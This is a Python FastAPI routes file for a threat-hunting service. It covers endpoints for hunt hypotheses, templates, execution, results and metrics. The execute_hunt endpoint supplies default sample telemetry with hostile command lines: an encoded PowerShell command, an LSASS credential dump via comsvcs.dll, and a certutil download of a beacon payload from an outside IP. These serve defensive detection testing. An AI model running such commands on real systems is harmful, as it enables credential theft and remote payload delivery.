"""
Threat Hunting REST API Routes.
Exposes endpoints for managing hypotheses, executing hunts, and querying results.
"""

from typing import Any, Dict, List, Optional
from fastapi import APIRouter, HTTPException, Query, status

from cybershield.hunting.engine import ThreatHuntingEngine
from cybershield.hunting.queries import BUILTIN_HUNT_TEMPLATES
from cybershield.hunting.schemas import (
    HuntExecutionRequest,
    HuntExecutionResult,
    HuntHypothesis,
    HuntStatus,
    HuntTemplate,
)

hunting_router = APIRouter(prefix="/api/hunting", tags=["Threat Hunting"])
hunting_engine = ThreatHuntingEngine()


@hunting_router.get("/hypotheses", response_model=List[HuntHypothesis])
async def list_hypotheses(status_filter: Optional[HuntStatus] = Query(None, alias="status")):
    """List hunting hypotheses with optional status filter."""
    return hunting_engine.list_hypotheses(status_filter)


@hunting_router.post("/hypotheses", response_model=HuntHypothesis, status_code=status.HTTP_201_CREATED)
async def create_hypothesis(hypothesis: HuntHypothesis):
    """Create a new proactive threat hunting hypothesis."""
    return hunting_engine.create_hypothesis(hypothesis)


@hunting_router.get("/hypotheses/{hypothesis_id}", response_model=HuntHypothesis)
async def get_hypothesis(hypothesis_id: str):
    """Retrieve details of a specific hypothesis."""
    hypo = hunting_engine.get_hypothesis(hypothesis_id)
    if not hypo:
        raise HTTPException(status_code=404, detail=f"Hypothesis {hypothesis_id} not found")
    return hypo


@hunting_router.delete("/hypotheses/{hypothesis_id}")
async def delete_hypothesis(hypothesis_id: str):
    """Delete a hypothesis by ID."""
    success = hunting_engine.delete_hypothesis(hypothesis_id)
    if not success:
        raise HTTPException(status_code=404, detail=f"Hypothesis {hypothesis_id} not found")
    return {"status": "deleted", "hypothesis_id": hypothesis_id}


@hunting_router.get("/templates", response_model=List[HuntTemplate])
async def list_templates():
    """List built-in curated hunting templates."""
    return BUILTIN_HUNT_TEMPLATES


class HuntRunPayload(HuntExecutionRequest):
    telemetry_events: Optional[List[Dict[str, Any]]] = None


@hunting_router.post("/execute", response_model=HuntExecutionResult)
async def execute_hunt(payload: HuntRunPayload):
    """Execute a threat hunt against incoming or provided telemetry events."""
    events = payload.telemetry_events or [
        {
            "id": "evt-101",
            "hostname": "FINANCE-PC04",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            "user_name": "cfo_assistant",
            "timestamp": "2026-09-12T10:00:00Z",
        },
        {
            "id": "evt-102",
            "hostname": "DC01",
            "process_name": "cmd.exe",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
            "user_name": "SYSTEM",
            "timestamp": "2026-09-12T10:01:00Z",
        },
        {
            "id": "evt-103",
            "hostname": "WEB-SRV",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://185.220.101.5/beacon.bin C:\\temp\\beacon.bin",
            "user_name": "www-data",
            "timestamp": "2026-09-12T10:02:00Z",
        },
    ]

    try:
        result = hunting_engine.execute_hunt(payload, events)
        return result
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))


@hunting_router.get("/results", response_model=List[HuntExecutionResult])
async def list_results():
    """List completed hunt executions."""
    return hunting_engine.list_execution_results()


@hunting_router.get("/results/{execution_id}", response_model=HuntExecutionResult)
async def get_result(execution_id: str):
    """Get results of a specific hunt execution."""
    res = hunting_engine.get_execution_result(execution_id)
    if not res:
        raise HTTPException(status_code=404, detail=f"Execution {execution_id} not found")
    return res


@hunting_router.get("/metrics")
async def get_metrics():
    """Get metrics on hunting hypotheses, findings, and tactic distributions."""
    return hunting_engine.get_hunt_metrics()
